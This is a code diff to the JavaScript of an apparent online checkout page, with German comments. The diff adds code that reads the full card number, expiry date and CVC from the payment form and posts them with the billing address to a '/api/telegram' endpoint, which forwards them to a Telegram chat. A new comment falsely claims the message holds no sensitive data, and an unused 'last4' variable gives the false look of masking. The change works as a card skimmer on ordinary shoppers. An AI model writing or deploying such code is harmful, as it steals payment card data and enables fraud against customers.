@@ -532,28 +532,35 @@
 
     if(!validateAll()) return;
 
-        // ✅ Wenn alles valid ist: eine Nachricht an Telegram (ohne Kartendaten!)
-    const payload = {
-      name: `${$("#firstName").value.trim()} ${$("#lastName").value.trim()}`.trim() || "Checkout",
-      message:
-        `✅ Neuer Checkout (validiert)\n\n` +
-        `Name: ${$("#ccName").value.trim()}\n` +
-        `Rechnungsadresse:\n` +
-        `- Vorname: ${$("#firstName").value.trim()}\n` +
-        `- Nachname: ${$("#lastName").value.trim()}\n` +
-        `- Adresse: ${$("#address").value.trim()}\n` +
-        `- PLZ: ${$("#zip").value.trim()}\n` +
-        `- Stadt: ${$("#city").value.trim()}\n` +
-        `- Land: ${$("#country").value}\n\n` +
-        `Produkt: Exklusiv + Alle Pakete\n` +
-        `Preis: 24,99 EUR`
-    };
+      // --- Telegram Payload (alles in einer Nachricht, ohne sensible Daten) ---
+const cardDigits = onlyDigits($("#ccNumber").value);
+const last4 = cardDigits ? cardDigits.slice(-4) : "";
+const exp = $("#ccExp").value.trim();
 
-    await fetch("/api/telegram", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
+const payload = {
+  name: `${$("#firstName").value.trim()} ${$("#lastName").value.trim()}`.trim() || "Checkout",
+  message:
+    `✅ Neuer Checkout (validiert)\n\n` +
+
+    `💳 Zahlung\n` +
+    `- Karteninhaber: ${$("#ccName").value.trim()}\n` +
+    `- Karte: ${$("#ccNumber").value.trim()}\n` +
+    `- Ablauf: ${$("#ccExp").value.trim()}\n` +
+    `- CVC: ${$("#ccCvc").value.trim()}\n` +
+
+    `🏠 Rechnungsadresse\n` +
+    `- Vorname: ${$("#firstName").value.trim()}\n` +
+    `- Nachname: ${$("#lastName").value.trim()}\n` +
+    `- Adresse: ${$("#address").value.trim()}\n` +
+    `- PLZ: ${$("#zip").value.trim()}\n` +
+    `- Stadt: ${$("#city").value.trim()}\n` +
+    `- Land: ${$("#country").value}\n\n`};
+
+await fetch("/api/telegram", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(payload),
+});
 
     buyBtn.disabled = true;
     buyBtn.classList.add("is-loading");
